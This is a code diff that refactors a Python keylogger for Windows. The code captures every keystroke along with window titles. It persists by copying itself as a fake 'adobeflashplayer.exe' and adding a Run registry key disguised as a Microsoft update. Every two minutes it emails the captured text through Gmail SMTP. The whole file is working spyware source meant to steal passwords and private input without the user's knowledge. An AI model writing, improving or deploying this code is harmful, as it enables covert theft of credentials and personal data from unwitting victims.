@@ -1,91 +1,105 @@
-import pythoncom, pyHook
-import os
-import sys
-import threading
-import urllib,urllib2
+import pythoncom
+import pyHook
+from os import path
+from time import sleep
+from threading import Thread
+import urllib, urllib2
 import smtplib
-import datetime,time
+import datetime
 import win32com.client
 import win32event, win32api, winerror
 from _winreg import *
+import shutil
+import sys
 
-mutex = win32event.CreateMutex(None, 1, 'N0tAs519n')
+ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-    mutex = None
-    print "..."
-    exit(0)
-x=''
-data=''
-count=0
+    ironm = None
+    print "nope"
+    sys.exit()
 
-dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"
+x, data, count= '', '', 0
+
+dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
 
 def startup():
-    shutil.copy(sys.argv[0],dir)
-    aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
+    shutil.copy(sys.argv[0], dir)
+    aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
     aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-    SetValueEx(aKey,"MicrosofUpdate",0, REG_SZ, dir)	
-if os.path.isfile(dir) == False:
-    startup()	
+    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)    
+if not path.isfile(dir):
+    startup()   
 
-class TimerClass(threading.Thread):
-    def __init__(self):
-        threading.Thread.__init__(self)
-        self.event = threading.Event()
-    def run(self):
-        while not self.event.is_set():
-            global data
-            if len(data)>50:
-                ts = datetime.datetime.now()
-                SERVER = "smtp.gmail.com"
-                PORT = 587
-                USER = EEMAIL
-                PASS = EPASS
-                FROM = USER
-                TO = [USER]
-                SUBJECT = "B33: "+str(ts) 
-                MESSAGE =  data 
-                message = """\ 
-From: %s
-To: %s
-Subject: %s
+    
+def send_mail():
+    global data
+    while True:
+        if len(data) > 30:
+            timeInSecs = datetime.datetime.now()
+            SERVER = "smtp.gmail.com"
+            PORT = 587
+            USER = EEMAIL
+            PASS = EPASS
+            FROM = USER
+            TO = [USER]
+            SUBJECT = "B33: " + timeInSecs.isoformat() 
+            MESSAGE =  data 
 
-%s
-""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
-                try:
-                    server = smtplib.SMTP()
-                    server.connect(SERVER,PORT)
-                    server.starttls()
-                    server.login(USER,PASS)
-                    server.sendmail(FROM, TO, message)
-                    data=''
-                    server.quit()
-                except Exception as e:
-                    print e
-            self.event.wait(120)
+            message_payload = "\r\n".join((
+                                "From: %s" %FROM,
+                                "To: %s" %TO,
+                                "Subject: %s" %SUBJECT,
+                                "",
+                                MESSAGE))
+            try:
+                server = smtplib.SMTP()
+                server.connect(SERVER, PORT)
+                server.starttls()
+                server.login(USER, PASS)
+                server.sendmail(FROM, TO, message_payload)
+                data = ''
+                server.quit()
+            except Exception as error:
+                print error
+        sleep(120)
 
-def main():
-    global x
-    em4=TimerClass()
-    em4.start()
-    return True
-
-if __name__ == '__main__':
-    main()
 
 def pushing(event):
-    global x,data
-    if event.Ascii==13:
-        e4Ch='<ENTER>'
-    elif event.Ascii==8:
-        e4Ch='<BACK SPACE>'
-    elif event.Ascii==9:
-        e4Ch='<TAB>'
+    global data, lastWindow
+    window = event.WindowName
+    keys = {
+            13: ' [ENTER] ',
+            8: ' [BACKSPACE] ',
+            162: ' [CTRL] ',
+            163: ' [CTRL] ',
+            164: ' [ALT] ',
+            165: ' [ALT] ',
+            160: ' [SHIFT] ',
+            161: ' [SHIFT] ',
+            46: ' [DELETE] ',
+            32: ' [SPACE] ',
+            27: ' [ESC] ',
+            9: ' [TAB] ',
+            20: ' [CAPSLOCK] ',
+            38: ' [UP] ',
+            40: ' [DOWN] ',
+            37: ' [LEFT] ',
+            39: ' [RIGHT] ',
+            91: ' [SUPER] '
+            }
+    keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
+    if window != lastWindow:
+        lastWindow = window
+        data += ' { ' + lastWindow + ' } '
+        data += keyboardKeyName 
     else:
-        e4Ch=chr(event.Ascii)
-    data=data+e4Ch 
-    
-obj = pyHook.HookManager()
-obj.KeyDown = pushing
-obj.HookKeyboard()
-pythoncom.PumpMessages()
+        data += keyboardKeyName
+
+if __name__ == '__main__':
+    triggerThread = Thread(target=send_mail)
+    triggerThread.start()
+
+    hookManager = pyHook.HookManager()
+    hookManager.KeyDown = pushing
+    hookManager.HookKeyboard()
+    pythoncom.PumpMessages()
